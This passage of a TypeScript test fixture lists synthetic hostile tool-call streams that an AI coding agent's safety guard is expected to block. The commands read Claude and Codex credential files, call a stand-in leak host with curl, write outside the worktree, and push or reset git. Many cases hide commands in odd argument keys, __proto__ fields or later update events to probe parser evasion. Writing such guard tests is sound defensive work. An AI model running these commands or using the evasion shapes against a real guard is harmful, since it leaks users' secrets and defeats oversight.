        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        MODEL_ERROR,
      ],
    },
    {
      name: "shell write outside the worktree, then a provider auth error",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, then a provider auth error", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        AUTH_ERROR,
        end(),
      ],
    },
    {
      name: "shell write outside the worktree, then a provider auth error, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, then a provider auth error, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        AUTH_ERROR,
      ],
    },
    {
      name: "shell write outside the worktree, then a provider rate limit error",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, then a provider rate limit error", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        RATE_LIMIT_ERROR,
        end(),
      ],
    },
    {
      name: "shell write outside the worktree, then a provider rate limit error, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree, then a provider rate limit error, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        RATE_LIMIT_ERROR,
      ],
    },
    {
      name: "shell network call, then a provider model error",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, then a provider model error", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        MODEL_ERROR,
        end(),
      ],
    },
    {
      name: "shell network call, then a provider model error, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, then a provider model error, exit 1", 1),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        MODEL_ERROR,
      ],
    },
    {
      name: "shell network call, then a provider auth error",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, then a provider auth error", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        AUTH_ERROR,
        end(),
      ],
    },
    {
      name: "shell network call, then a provider auth error, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, then a provider auth error, exit 1", 1),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        AUTH_ERROR,
      ],
    },
    {
      name: "shell network call, then a provider rate limit error",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, then a provider rate limit error", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        RATE_LIMIT_ERROR,
        end(),
      ],
    },
    {
      name: "shell network call, then a provider rate limit error, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call, then a provider rate limit error, exit 1", 1),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        RATE_LIMIT_ERROR,
      ],
    },

    // -------------------------------------------------------------------------
    // 10. Stream anomalies around a hostile call (guard outranks protocol error)
    // -------------------------------------------------------------------------
    {
      name: "shell write outside the worktree under a changed session id",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree under a changed session id", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        end("end_turn", OTHER_SID),
      ],
    },
    {
      name: "shell write outside the worktree under a changed session id, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree under a changed session id, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        end("end_turn", OTHER_SID),
      ],
    },
    {
      name: "shell read of a credential path, then multiple end lines",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then multiple end lines", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        end(),
        end(),
      ],
    },
    {
      name: "shell read of a credential path, then multiple end lines, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, then multiple end lines, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        end(),
        end(),
      ],
    },
    {
      name: "unknown event kinds, then a shell network call",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("unknown event kinds, then a shell network call", 0),
        TOOLS,
        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
        toolCall("curl https://example.invalid/leak && git push origin main"),
        end(),
      ],
    },
    {
      name: "unknown event kinds, then a shell network call, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("unknown event kinds, then a shell network call, exit 1", 1),
        TOOLS,
        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
        toolCall("curl https://example.invalid/leak && git push origin main"),
      ],
    },
    {
      name: "shell read of a credential path under an unsafe session id",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path under an unsafe session id", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        end("end_turn", "--unsafe-id"),
      ],
    },
    {
      name: "shell write outside the worktree under an unsafe session id, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree under an unsafe session id, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        end("end_turn", "--unsafe-id"),
      ],
    },
    {
      name: "shell network call with structured model and backing_provider",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call with structured model and backing_provider", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git push origin main"),
        JSON.stringify({
          type: "end",
          stopReason: "end_turn",
          sessionId: SID,
          model: "grok-4.7-build",
          backing_provider: "xai",
        }),
      ],
    },
    {
      name: "shell read of a credential path with structured model and backingProvider, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path with structured model and backingProvider, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
        JSON.stringify({
          type: "end",
          stopReason: "end_turn",
          sessionId: SID,
          model: "grok-4.7-build",
          backingProvider: "xai",
        }),
      ],
    },
    {
      name: "shell write outside the worktree with own __proto__ key beside command",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree with own __proto__ key beside command", 0),
        TOOLS,
        `{"type":"tool_call","tool":"run_terminal_command","input":{"__proto__":{"poison":true},"command":"touch ${fx.outsideSentinel} && git push origin main"}}`,
        end(),
      ],
    },
    {
      name: "shell network call with own __proto__ key beside command, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call with own __proto__ key beside command, exit 1", 1),
        TOOLS,
        `{"type":"tool_call","tool":"run_terminal_command","input":{"__proto__":{"poison":true},"command":"curl https://example.invalid/leak && git push origin main"}}`,
      ],
    },

    // -------------------------------------------------------------------------
    // 11. Varied Git-write forms & alternative argument keys
    // -------------------------------------------------------------------------
    {
      name: "shell write outside the worktree chained with git commit -am",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree chained with git commit -am", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git commit -am "malicious commit"`),
        end(),
      ],
    },
    {
      name: "shell network call chained with git -C push --force",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call chained with git -C push --force", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git -C . push --force"),
        end(),
      ],
    },
    {
      name: "shell read of a credential path chained with git update-ref, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path chained with git update-ref, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git update-ref refs/heads/main HEAD~1`),
      ],
    },
    {
      name: "shell write outside the worktree chained with git branch -D",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree chained with git branch -D", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git branch -D main`),
        end(),
      ],
    },
    {
      name: "tool_call with alternative parameters key carrying a Git write",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call with alternative parameters key carrying a Git write", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          parameters: { command: `cat ${fx.claudeCredentialsPath} && git push origin main` },
        }),
        end(),
      ],
    },
    {
      name: "tool_call with alternative args key carrying a Git write",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call with alternative args key carrying a Git write", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          args: { cmd: "curl https://example.invalid/leak && git push origin main" },
        }),
        end(),
      ],
    },
    {
      name: "tool_call with top-level cmd key carrying a Git write, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call with top-level cmd key carrying a Git write, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          cmd: `touch ${fx.outsideSentinel} && git push origin main`,
        }),
      ],
    },

    // -------------------------------------------------------------------------
    // 12. Argument-key, tool-name and call-id shapes, and Git forms a prefix deny misses
    //     (still synthetic: the live check recorded only `type` on tool lines)
    // -------------------------------------------------------------------------
    {
      name: "tool_call input.cmd carrying git tag, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call input.cmd carrying git tag, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          input: { cmd: `cat ${fx.codexAuthPath} && git tag malicious` },
        }),
      ],
    },
    {
      name: "tool_call top-level command carrying git stash",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call top-level command carrying git stash", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          command: `touch ${fx.outsideSentinel} && git stash push -m x`,
        }),
        end(),
      ],
    },
    {
      name: "tool_call arguments.CommandLine carrying a Git write",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call arguments.CommandLine carrying a Git write", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          arguments: { CommandLine: `cat ${fx.claudeCredentialsPath} && git push origin main` },
        }),
        end(),
      ],
    },
    {
      name: "tool_call top-level CommandLine carrying env git push, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call top-level CommandLine carrying env git push, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          CommandLine: "curl https://example.invalid/leak && env git push origin main",
        }),
      ],
    },
    {
      name: "tool_call input.CommandLine carrying git -C commit",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call input.CommandLine carrying git -C commit", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          input: { CommandLine: `touch ${fx.outsideSentinel} && git -C . commit --allow-empty -m x` },
        }),
        end(),
      ],
    },
    {
      name: "shell named via name, absolute git commit, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell named via name, absolute git commit, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          name: "bash",
          input: {
            CommandLine: `cat ${fx.codexAuthPath} && /usr/bin/git commit --allow-empty -m x`,
          },
        }),
      ],
    },
    {
      name: "shell named via tool_name, sh -c git push",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell named via tool_name, sh -c git push", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool_name: "run_terminal_command",
          arguments: { CommandLine: `touch ${fx.outsideSentinel} && sh -c 'git push origin main'` },
        }),
        end(),
      ],
    },
    {
      name: "hostile command only on tool_call_update parameters",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("hostile command only on tool_call_update parameters", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call_update",
          tool: "run_terminal_command",
          parameters: { command: "curl https://example.invalid/leak && git reset --hard HEAD" },
        }),
        end(),
      ],
    },
    {
      name: "call_id swap to arguments.CommandLine with /usr/bin/git",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("call_id swap to arguments.CommandLine with /usr/bin/git", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          id: "call-a",
          tool: "run_terminal_command",
          input: { command: "echo benign" },
        }),
        JSON.stringify({
          type: "tool_call_update",
          call_id: "call-a",
          arguments: {
            CommandLine: `cat ${fx.claudeCredentialsPath} && /usr/bin/git commit --allow-empty -m x`,
          },
        }),
        end(),
      ],
    },
    {
      name: "tool_call_id late args.cmd carrying git -C commit, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call_id late args.cmd carrying git -C commit, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool_call_id: "call-b",
          tool: "run_terminal_command",
        }),
        JSON.stringify({
          type: "tool_call_update",
          tool_call_id: "call-b",
          args: { cmd: `touch ${fx.outsideSentinel} && git -C . commit --allow-empty -m x` },
        }),
      ],
    },
    {
      name: "shell read chained with xargs git push",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read chained with xargs git push", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && xargs git push`),
        end(),
      ],
    },
    {
      name: "shell network call chained with git --git-dir commit, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call chained with git --git-dir commit, exit 1", 1),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git --git-dir=.git commit --allow-empty -m x"),
      ],
    },
    {
      name: "shell read of a credential path chained with git merge",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path chained with git merge", 0),
        TOOLS,
        toolCall(`cat ${fx.claudeCredentialsPath} && git merge origin/feature`),
        end(),
      ],
    },
    {
      name: "shell write outside the worktree chained with git rebase, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree chained with git rebase, exit 1", 1),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git rebase origin/main`),
      ],
    },
    {
      name: "shell network call chained with git pull",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call chained with git pull", 0),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git pull origin main"),
        end(),
      ],
    },
    {
      name: "shell read of a credential path chained with git cherry-pick, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path chained with git cherry-pick, exit 1", 1),
        TOOLS,
        toolCall(`cat ${fx.codexAuthPath} && git cherry-pick abc1234`),
      ],
    },
    {
      name: "shell write outside the worktree chained with git checkout -b",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree chained with git checkout -b", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git checkout -b hostile-branch`),
        end(),
      ],
    },
    {
      name: "shell network call chained with git revert, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call chained with git revert, exit 1", 1),
        TOOLS,
        toolCall("curl https://example.invalid/leak && git revert HEAD"),
      ],
    },
    {
      name: "tool_call input.cmd carrying git push",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call input.cmd carrying git push", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          input: { cmd: `cat ${fx.claudeCredentialsPath} && git push origin main` },
        }),
        end(),
      ],
    },
    {
      name: "tool_call parameters.CommandLine carrying git commit, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call parameters.CommandLine carrying git commit, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          parameters: { CommandLine: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
        }),
      ],
    },
    {
      name: "tool_call args.CommandLine carrying git push",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call args.CommandLine carrying git push", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          args: { CommandLine: "curl https://example.invalid/leak && git push origin main" },
        }),
        end(),
      ],
    },
    {
      name: "tool_call arguments.cmd carrying git reset, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call arguments.cmd carrying git reset, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          arguments: { cmd: `cat ${fx.codexAuthPath} && git reset --hard HEAD` },
        }),
      ],
    },
    {
      name: "tool_call without tool name carrying git commit",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call without tool name carrying git commit", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          input: { command: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
        }),
        end(),
      ],
    },
    {
      name: "tool_call without tool name carrying git push, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("tool_call without tool name carrying git push, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
      ],
    },

    // -------------------------------------------------------------------------
    // 13. Parser fall-through shapes, multi-call ordering and further exit codes
    // -------------------------------------------------------------------------
    {
      // `input` that is not an object is skipped; the parser falls through to `parameters`.
      name: "non-object input falls through to parameters carrying a Git write",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("non-object input falls through to parameters carrying a Git write", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          input: "ls",
          parameters: { command: `cat ${fx.claudeCredentialsPath} && git push origin main` },
        }),
        end(),
      ],
    },
    {
      name: "array input and null parameters fall through to args carrying a Git write, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("array input and null parameters fall through to args carrying a Git write, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          input: ["ls"],
          parameters: null,
          args: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
      ],
    },
    {
      // A non-string `command` is skipped; the parser falls through to `cmd` in the same object.
      name: "non-string input.command beside input.cmd carrying a Git write",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("non-string input.command beside input.cmd carrying a Git write", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          input: { command: ["ls"], cmd: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
        }),
        end(),
      ],
    },
    {
      // A command outranks a path: the call is a shell call even though `input.path` names a benign file.
      name: "input.path beside a top-level command carrying a Git write, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("input.path beside a top-level command carrying a Git write, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "run_terminal_command",
          input: { path: "README.md" },
          command: `cat ${fx.codexAuthPath} && git push origin main`,
        }),
      ],
    },
    {
      // Any readable command is a shell call for the guard, whatever the tool name says.
      name: "non-shell tool name carrying a command with a Git write, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("non-shell tool name carrying a command with a Git write, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "edit_file",
          input: { path: "README.md", command: `touch ${fx.outsideSentinel} && git push origin main` },
        }),
      ],
    },
    {
      name: "empty tool name and empty id carrying a Git write",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("empty tool name and empty id carrying a Git write", 0),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          tool: "",
          id: "",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
        end(),
      ],
    },
    {
      // A benign call that completes cleanly does not hide a later, separate hostile call.
      name: "benign completed call, then a separate hostile call",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("benign completed call, then a separate hostile call", 0),
        TOOLS,
        toolCall("ls"),
        JSON.stringify({ type: "tool_call_update", status: "completed", content: "exit: 0\nREADME.md" }),
        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        sandboxDenied(`cat ${fx.claudeCredentialsPath} && git push origin main`),
        end(),
      ],
    },
    {
      // The guard verdict on the first report stays: a later update back to a benign command does not clear it.
      name: "hostile call swapped back to a benign command in tool_call_update, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("hostile call swapped back to a benign command in tool_call_update, exit 1", 1),
        TOOLS,
        JSON.stringify({
          type: "tool_call",
          id: "call-c",
          tool: "run_terminal_command",
          input: { command: "curl https://example.invalid/leak && git push origin main" },
        }),
        JSON.stringify({
          type: "tool_call_update",
          id: "call-c",
          status: "completed",
          input: { command: "ls" },
        }),
      ],
    },
    {
      name: "hostile call swapped back to a benign command in tool_call_update",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("hostile call swapped back to a benign command in tool_call_update", 0),
        TOOLS,
        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
        JSON.stringify({ type: "tool_call_update", status: "completed", input: { command: "ls" } }),
        end(),
      ],
    },
    // Exit codes other than 0 and 1 (T4.22 expects only 0): the guard verdict still outranks TOOL_FAILURE.
    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) =>
      [2, 137].map(
        (exitCode): HostileStream => ({
          name: `${category} with a Git write, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category} with a Git write, exit ${exitCode}`, exitCode),
            TOOLS,
            toolCall(
              category === "credential_read"
                ? `cat ${fx.claudeCredentialsPath} && git push origin main`
                : category === "out_of_worktree_write"
                  ? `touch ${fx.outsideSentinel} && git push origin main`
                  : "curl https://example.invalid/leak && git push origin main",
            ),
            ...(exitCode === 2 ? [end()] : []),
          ],
        }),
      ),
    ),
    // Trailing `tool_call_update` residual (w411; parser unchanged): after the `end` line, an update the parser cannot
    // read (status and content only) or one that repeats an already reported command emits no `tool_call`, so it does
    // not count as a call after `end`. Neither may hide the guard verdict on the hostile call that preceded `end`.
    ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
      const command =
        category === "credential_read"
          ? `cat ${fx.claudeCredentialsPath} && git push origin main`
          : category === "out_of_worktree_write"
            ? `touch ${fx.outsideSentinel} && git push origin main`
            : "curl https://example.invalid/leak && git push origin main";
      return [0, 1].flatMap((exitCode): HostileStream[] => [
        {
          name: `${category} with a Git write, then an unreadable tool_call_update after the end line, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category}: unreadable tool_call_update after the end line, exit ${exitCode}`, exitCode),
            TOOLS,
            toolCall(command),
            end(),
            sandboxDenied(command),
          ],
        },
        {
          name: `${category} with a Git write, then the same command repeated in tool_call_update after the end line, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "PERMISSION_BLOCKED",
          lines: [
            META(`${category}: identical tool_call_update after the end line, exit ${exitCode}`, exitCode),
            TOOLS,
            JSON.stringify({ type: "tool_call", id: "call_trail", tool: "run_terminal_command", input: { command } }),
            end(),
            JSON.stringify({
              type: "tool_call_update",
              id: "call_trail",
              tool: "run_terminal_command",
              status: "completed",
              input: { command },
            }),
          ],
        },
      ]);
    }),

    // -------------------------------------------------------------------------
    // 13b-d. Residual blocked streams (JSON encodings, second- & third-pass parser branches)
    // -------------------------------------------------------------------------
    ...grokResidualStreams(fx),

    // -------------------------------------------------------------------------
    // 14. Unknown event kinds category
    // -------------------------------------------------------------------------
    {
      name: "only unknown event kinds, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Event types below are invented; the adapter must report them unknown.", 0),
        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
        JSON.stringify({ type: "synthetic_another_unknown", sessionId: SID }),
      ],
    },
    {
      // Exit 1 is not an expected exit code (T4.22), so the run ends TOOL_FAILURE; never success.
      name: "only unknown event kinds, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Event types below are invented; the adapter must report them unknown.", 1),
        JSON.stringify({ type: "synthetic_unknown_kind", sessionId: SID }),
      ],
    },
    {
      // Prototype-named, near-miss, non-string and missing type properties never resolve to a known event.
      name: "only prototype-named, near-miss and non-string event types, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Event types below are invented or not strings; the adapter must report them unknown.", 0),
        JSON.stringify({ type: "__proto__", sessionId: SID }),
        JSON.stringify({ type: "constructor", sessionId: SID }),
        JSON.stringify({ type: "tool-call", tool: "run_terminal_command" }),
        JSON.stringify({ type: 1, sessionId: SID }),
        JSON.stringify({ type: true, sessionId: SID }),
        JSON.stringify({ sessionId: SID }),
        JSON.stringify({ type: "available-commands" }),
      ],
    },
    {
      // Prototype-named and near-miss event types at exit 1
      name: "only prototype-named, near-miss and non-string event types, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Event types below are invented or not strings; the adapter must report them unknown.", 1),
        JSON.stringify({ type: "__proto__", sessionId: SID }),
        JSON.stringify({ type: "constructor", sessionId: SID }),
        JSON.stringify({ type: "finish", stopReason: "end_turn" }),
      ],
    },
    {
      // Row 4b recorded only `{"type":"tool_call"}`. No readable command, so these stay `unknown`. There is no `end`
      // line: a bare call before a clean `end_turn` is still success (grok.test.ts). That remains roadmap gap (1).
      name: "live-bare tool_call, non-string fields and prototype-key commands, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Bare and unreadable tool lines; the adapter must report them unknown.", 0),
        JSON.stringify({ type: "tool_call" }),
        JSON.stringify({ type: "tool_call", input: { command: 7 } }),
        JSON.stringify({ type: "tool_call", command: ["git", "push"] }),
        `{"type":"tool_call","__proto__":{"command":"git push origin main"}}`,
        `{"type":"tool_call","parameters":{"__proto__":{"command":"git push origin main"}}}`,
        `{"type":"tool_call_update","__proto__":{"command":"git push origin main"}}`,
        "null",
        "123",
      ],
    },
    {
      name: "live-bare tool_call and prototype-key commands, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Bare and unreadable tool lines; the adapter must report them unknown.", 1),
        JSON.stringify({ type: "tool_call" }),
        `{"type":"tool_call","arguments":{"__proto__":{"command":"git push origin main"}}}`,
        JSON.stringify({ type: "tool_call_update" }),
      ],
    },
    {
      name: "unreadable text and end lines, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Unreadable text and end shapes without required fields; adapter must report them unknown.", 0),
        JSON.stringify({ type: "text" }),
        JSON.stringify({ type: "text", data: 42 }),
        JSON.stringify({ type: "end" }),
        JSON.stringify({ type: "end", stopReason: false }),
        JSON.stringify({ type: "tool_call_update" }),
      ],
    },
    {
      name: "unreadable text, end and bare tool_call_update, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Unreadable text and end shapes without required fields at exit 1.", 1),
        JSON.stringify({ type: "text", data: { not: "a string" } }),
        JSON.stringify({ type: "end", stopReason: 123 }),
        JSON.stringify({ type: "tool_call_update" }),
      ],
    },
    {
